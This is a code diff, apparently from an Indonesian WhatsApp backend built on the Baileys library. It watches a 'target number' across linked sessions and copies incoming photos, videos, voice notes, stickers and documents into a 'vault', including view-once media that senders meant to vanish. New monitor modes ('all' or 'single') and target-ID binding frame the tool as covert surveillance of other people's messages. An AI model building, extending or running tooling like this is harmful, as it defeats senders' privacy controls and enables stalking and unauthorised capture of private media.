+              emitVaultItem(sessionId, currentSession, payload);
+              io.to(sessionId).emit('vault-activity', {
+                time: Date.now(),
+                text: `Foto masuk dari ${senderInfo.senderName} berhasil diamankan.`
+              });
+            }
+            continue;
+          }
+
+          // 2c. Pesan Video Biasa
+          if (msg.message?.videoMessage && !voCheck) {
+            const mediaObj = msg.message.videoMessage;
+            const fileSize = Number(mediaObj.fileLength || 0);
+
+            if (fileSize <= 25 * 1024 * 1024) {
+              const buffer = await downloadMediaStreamBuffer(mediaObj, 'video', msg, sock);
+              if (buffer && buffer.length > 0) {
+                const mimeType = mediaObj.mimetype || 'video/mp4';
+                const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
+
+                const payload = buildVaultPayload({
+                  id: msg.key?.id,
+                  category: 'chat',
+                  senderNumber: senderInfo.phone,
+                  senderName: senderInfo.senderName,
+                  mediaType: 'video',
+                  mimeType,
+                  caption: mediaObj.caption || '',
+                  fileSize,
+                  isViewOnce: false,
+                  sentAt: msgTimestamp,
+                  base64Data
+                });
+
+                emitVaultItem(sessionId, currentSession, payload);
+                io.to(sessionId).emit('vault-activity', {
+                  time: Date.now(),
+                  text: `Video masuk dari ${senderInfo.senderName} berhasil diamankan.`
+                });
               }
             } else {
-              io.to(sessionId).emit('vault-activity', {
-                time: Date.now(),
-                text: 'Gagal mendekripsi media View Once: Buffer kosong'
+              const payload = buildVaultPayload({
+                id: msg.key?.id,
+                category: 'chat',
+                senderNumber: senderInfo.phone,
+                senderName: senderInfo.senderName,
+                mediaType: 'video',
+                caption: (mediaObj.caption || '') + ' (Video > 25MB)',
+                fileSize,
+                isViewOnce: false,
+                sentAt: msgTimestamp,
+                base64Data: ''
               });
+              emitVaultItem(sessionId, currentSession, payload);
             }
-          } else if (remoteJid.endsWith('@lid')) {
-            const buffer = await downloadMediaStreamBuffer(
-              mediaObj,
-              mediaType,
-              { key: msg.key, message: unwrappedMessage },
-              sock
-            );
+            continue;
+          }
 
+          // 2d. Voice Note / Audio
+          if (msg.message?.audioMessage && !voCheck) {
+            const mediaObj = msg.message.audioMessage;
+            const isVoiceNote = Boolean(mediaObj.ptt);
+            const buffer = await downloadMediaStreamBuffer(mediaObj, 'audio', msg, sock);
             if (buffer && buffer.length > 0) {
-              const mimeType = mediaObj.mimetype || (mediaType === 'image' ? 'image/jpeg' : 'video/mp4');
+              const mimeType = mediaObj.mimetype || 'audio/ogg';
               const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
-              const sentAt = Number(msg.messageTimestamp) ? Number(msg.messageTimestamp) * 1000 : Date.now();
 
-              const unmappedPayload = {
-                id: String(msg.key?.id || Date.now()),
-                senderNumber: currentSession.targetNumber,
-                senderName: String(msg.pushName || 'Kontak Tanpa Nama'),
-                mediaType: String(mediaType),
-                mimeType: String(mimeType),
-                caption: String(mediaObj.caption || ''),
-                sentAt: Number(sentAt),
+              const payload = buildVaultPayload({
+                id: msg.key?.id,
+                category: 'chat',
+                senderNumber: senderInfo.phone,
+                senderName: senderInfo.senderName,
+                mediaType: 'audio',
+                mimeType,
+                isVoiceNote,
+                sentAt: msgTimestamp,
                 base64Data
-              };
-
-              if (!currentSession.unmappedLidQueue) currentSession.unmappedLidQueue = new Map();
-              let list = currentSession.unmappedLidQueue.get(remoteJid) || [];
-              list.push({ payload: unmappedPayload, createdAt: Date.now() });
-              if (list.length > 5) list.shift();
-              currentSession.unmappedLidQueue.set(remoteJid, list);
-
-              io.to(sessionId).emit('unmapped-lid-view-once', {
-                lid: remoteJid,
-                pushName: String(msg.pushName || 'Kontak Tanpa Nama'),
-                mediaType: String(mediaType),
-                sentAt
               });
 
+              emitVaultItem(sessionId, currentSession, payload);
               io.to(sessionId).emit('vault-activity', {
                 time: Date.now(),
-                text: 'View Once masuk dari ID tersembunyi (' + (msg.pushName || remoteJid) + '). Konfirmasi jika itu nomor target Anda.'
+                text: `${isVoiceNote ? 'Voice Note' : 'Audio'} dari ${senderInfo.senderName} berhasil diamankan.`
               });
             }
+            continue;
+          }
+
+          // 2e. Stiker
+          if (msg.message?.stickerMessage) {
+            const mediaObj = msg.message.stickerMessage;
+            const buffer = await downloadMediaStreamBuffer(mediaObj, 'sticker', msg, sock);
+            if (buffer && buffer.length > 0) {
+              const mimeType = 'image/webp';
+              const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
+
+              const payload = buildVaultPayload({
+                id: msg.key?.id,
+                category: 'chat',
+                senderNumber: senderInfo.phone,
+                senderName: senderInfo.senderName,
+                mediaType: 'sticker',
+                mimeType,
+                sentAt: msgTimestamp,
+                base64Data
+              });
+
+              emitVaultItem(sessionId, currentSession, payload);
+            }
+            continue;
+          }
+
+          // 2f. Dokumen
+          if (msg.message?.documentMessage) {
+            const mediaObj = msg.message.documentMessage;
+            const fileName = mediaObj.fileName || 'Dokumen';
+            const fileSize = Number(mediaObj.fileLength || 0);
+
+            if (fileSize <= 15 * 1024 * 1024) {
+              const buffer = await downloadMediaStreamBuffer(mediaObj, 'document', msg, sock);
+              if (buffer && buffer.length > 0) {
+                const mimeType = mediaObj.mimetype || 'application/octet-stream';
+                const base64Data = 'data:' + mimeType + ';base64,' + buffer.toString('base64');
+
+                const payload = buildVaultPayload({
+                  id: msg.key?.id,
+                  category: 'chat',
+                  senderNumber: senderInfo.phone,
+                  senderName: senderInfo.senderName,
+                  mediaType: 'document',
+                  mimeType,
+                  fileName,
+                  fileSize,
+                  caption: mediaObj.caption || '',
+                  sentAt: msgTimestamp,
+                  base64Data
+                });
+
+                emitVaultItem(sessionId, currentSession, payload);
+                io.to(sessionId).emit('vault-activity', {
+                  time: Date.now(),
+                  text: `Dokumen "${fileName}" dari ${senderInfo.senderName} berhasil diamankan.`
+                });
+              }
+            } else {
+              const payload = buildVaultPayload({
+                id: msg.key?.id,
+                category: 'chat',
+                senderNumber: senderInfo.phone,
+                senderName: senderInfo.senderName,
+                mediaType: 'document',
+                fileName,
+                fileSize,
+                caption: 'Ukuran melebihi 15MB',
+                sentAt: msgTimestamp,
+                base64Data: ''
+              });
+              emitVaultItem(sessionId, currentSession, payload);
+            }
+            continue;
           }
         }
       }
@@ -1184,7 +1574,7 @@ io.on('connection', (socket) => {
   // Event 'resume-session' (Auto-Resume saat Klien Terhubung)
   socket.on('resume-session', async (payload) => {
     try {
-      const { sessionId, targetNumber, confirmedLids } = payload || {};
+      const { sessionId, targetNumber, monitorMode = 'all', confirmedLids } = payload || {};
       if (!sessionId) return;
 
       socket.join(sessionId);
@@ -1192,6 +1582,7 @@ io.on('connection', (socket) => {
       let session = sessions.get(sessionId);
 
       if (session) {
+        if (monitorMode) session.monitorMode = monitorMode;
         if (targetNumber) {
           const clean = normalizePhone(targetNumber);
           session.targetNumber = clean;
@@ -1225,6 +1616,7 @@ io.on('connection', (socket) => {
           socket.emit('session-status', {
             status: 'connected',
             phone,
+            monitorMode: session.monitorMode,
             targetNumber: session.targetNumber || ''
           });
 
@@ -1235,7 +1627,10 @@ io.on('connection', (socket) => {
           if (session.pendingMedia && session.pendingMedia.length > 0) {
             while (session.pendingMedia.length > 0) {
               const item = session.pendingMedia.shift();
-              socket.emit('view-once-media', item);
+              socket.emit('vault-item', item);
+              if (item.isViewOnce) {
+                socket.emit('view-once-media', item);
+              }
             }
           }
         } else if (session.status === 'pairing_ready' && session.pairingCode) {
@@ -1255,7 +1650,7 @@ io.on('connection', (socket) => {
       const sessionDir = getSessionDir(sessionId);
       const credsFile = path.join(sessionDir, 'creds.json');
       if (fs.existsSync(credsFile)) {
-        session = await startBaileys(sessionId, targetNumber ? normalizePhone(targetNumber) : null, false);
+        session = await startBaileys(sessionId, targetNumber ? normalizePhone(targetNumber) : null, false, 'pairing', '', false, monitorMode);
         return;
       }
 
@@ -1263,6 +1658,22 @@ io.on('connection', (socket) => {
     } catch (err) {
       console.error('Error resume-session:', err.message);
       socket.emit('session-status', { status: 'disconnected' });
+    }
+  });
+
+  // Event 'set-monitor-mode' ('all' | 'single')
+  socket.on('set-monitor-mode', (payload) => {
+    try {
+      const { sessionId, monitorMode } = payload || {};
+      if (!sessionId || !monitorMode) return;
+      const session = sessions.get(sessionId);
+      if (session) {
+        session.monitorMode = monitorMode;
+        session.lastActive = Date.now();
+      }
+      io.to(sessionId).emit('monitor-mode-synced', { monitorMode });
+    } catch (err) {
+      console.error('Error set-monitor-mode:', err.message);
     }
   });
 
@@ -1303,7 +1714,7 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Event 'confirm-target-lid' (Ikat @lid kontak WhatsApp tersembunyi)
+  // Event 'confirm-target-lid'
   socket.on('confirm-target-lid', async (payload) => {
     try {
       const { sessionId, lid } = payload || {};
@@ -1328,21 +1739,9 @@ io.on('connection', (socket) => {
         session.lidMap.set(session.targetNumber, cleanLid);
       }
 
-      if (session.unmappedLidQueue?.has(cleanLid)) {
-        const queuedList = session.unmappedLidQueue.get(cleanLid) || [];
-        for (const item of queuedList) {
-          const finalPayload = {
-            ...item.payload,
-            senderNumber: session.targetNumber || item.payload.senderNumber
-          };
-          io.to(sessionId).emit('view-once-media', finalPayload);
-        }
-        session.unmappedLidQueue.delete(cleanLid);
-      }
-
       io.to(sessionId).emit('vault-activity', {
         time: Date.now(),
-        text: 'ID target berhasil diikat permanen! Media View Once langsung dibuka.'
+        text: 'ID target berhasil diikat permanen!'
       });
     } catch (err) {
       console.error('Error confirm-target-lid:', err.message);
@@ -1367,10 +1766,18 @@ io.on('connection', (socket) => {
     }
   });
 
-  // Event 'start-session' (Mendukung authMethod: 'pairing' | 'qr' & forceNew)
+  // Event 'start-session'
   socket.on('start-session', async (payload) => {
     try {
-      const { sessionId, targetNumber, authMethod = 'pairing', pairingPhone = '', forceNew = false } = payload || {};
+      const {
+        sessionId,
+        targetNumber,
+        monitorMode = 'all',
+        authMethod = 'pairing',
+        pairingPhone = '',
+        forceNew = false
+      } = payload || {};
+
       if (!sessionId || typeof sessionId !== 'string') {
         return socket.emit('session-error', { message: 'ID Sesi tidak valid.' });
       }
@@ -1381,6 +1788,7 @@ io.on('connection', (socket) => {
 
       if (session) {
         session.lastActive = Date.now();
+        if (monitorMode) session.monitorMode = monitorMode;
         if (targetNumber) {
           session.targetNumber = normalizePhone(targetNumber);
           await resolveTargetIdentifiers(session);
@@ -1390,6 +1798,7 @@ io.on('connection', (socket) => {
           socket.emit('session-status', {
             status: session.status,
             phone: session.sock?.user?.id ? session.sock.user.id.split(':')[0] : '',
+            monitorMode: session.monitorMode,
             targetNumber: session.targetNumber || ''
           });
 
@@ -1399,7 +1808,6 @@ io.on('connection', (socket) => {
           return;
         }
 
-        // Jika QR Code sudah siap dan tidak dipaksa baru, kirim instan (0ms)!
         if (authMethod === 'qr' && session.status === 'qr_ready' && session.qrCode && !forceNew) {
           socket.emit('session-status', {
             status: 'qr_ready',
@@ -1411,7 +1819,6 @@ io.on('connection', (socket) => {
           return;
         }
 
-        // Jika Pairing Code sudah siap dan tidak dipaksa baru
         if (authMethod === 'pairing' && session.status === 'pairing_ready' && session.pairingCode && !forceNew) {
           socket.emit('pairing-code', { code: session.pairingCode });
           socket.emit('session-status', { status: 'pairing_ready', code: session.pairingCode });
@@ -1425,12 +1832,10 @@ io.on('connection', (socket) => {
         });
       }
 
-      // Beritahu frontend seketika bahwa proses pembuatan QR/Pairing dimulai
       if (authMethod === 'qr') {
         socket.emit('session-status', { status: 'generating_qr', targetNumber: session?.targetNumber || targetNumber || '' });
       }
 
-      // Bersihkan folder auth lama jika meminta penautan ulang / forceNew
       removeSessionDir(sessionId);
 
       session = await startBaileys(
@@ -1439,10 +1844,11 @@ io.on('connection', (socket) => {
         true,
         authMethod,
         pairingPhone,
-        Boolean(forceNew)
+        Boolean(forceNew),
+        monitorMode
       );
 
-      socket.emit('session-status', { status: session.status, targetNumber: session.targetNumber });
+      socket.emit('session-status', { status: session.status, targetNumber: session.targetNumber, monitorMode: session.monitorMode });
       if (session.targetNumber) {
         socket.emit('target-synced', { targetNumber: session.targetNumber });
       }
@@ -1460,10 +1866,6 @@ io.on('connection', (socket) => {
 
       const session = sessions.get(sessionId);
       if (session) {
-        if (session.presenceInterval) {
-          clearInterval(session.presenceInterval);
-          session.presenceInterval = null;
-        }
         try {
           session.sock?.ev?.removeAllListeners();
         } catch (_) {}
@@ -1495,10 +1897,6 @@ setInterval(() => {
     if (now - session.lastActive > IDLE_TIMEOUT_MS) {
       const room = io.sockets.adapter.rooms.get(sessionId);
       if (!room || room.size === 0) {
-        if (session.presenceInterval) {
-          clearInterval(session.presenceInterval);
-          session.presenceInterval = null;
-        }
         try {
           session.sock?.end();
         } catch (_) {}
@@ -1511,5 +1909,5 @@ setInterval(() => {
 }, 5 * 60 * 1000);
 
 server.listen(PORT, () => {
-  console.log(`[AllToolsKuro] WA Backend v1.7.0 aktif di port ${PORT}`);
+  console.log(`[AllToolsKuro] WA 4-in-1 Backend v2.0.0 aktif di port ${PORT}`);
 });
